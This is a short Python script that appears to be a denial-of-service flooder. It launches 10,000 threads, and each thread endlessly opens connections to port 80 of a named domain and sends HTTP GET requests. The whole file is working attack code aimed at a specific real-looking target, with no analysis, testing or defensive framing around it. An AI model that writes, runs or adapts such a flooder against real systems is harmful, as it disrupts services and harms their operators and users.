import socket
import threading
import time
start_time = time.time()
target = 'irnshk.ir'
port = 80
count=50
thr=10000
agent='Mozila/56'
path='/'
req = "GET %s HTTP/1.1\nCache-Control: no-cache\nPragma: no-cache\nUser-Agent: %s\r\nHost: %s\n\n"%(path, agent, target)

def payload():
    #for i in range(count):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto((req).encode('utf-8'), (target, port))
       # print(s.recv(4096))
        s.close()
for j in range(thr):
    thread = threading.Thread(target=payload)
    thread.start()
    print(thread.name)
print("--- %s seconds ---" % (time.time() - start_time))
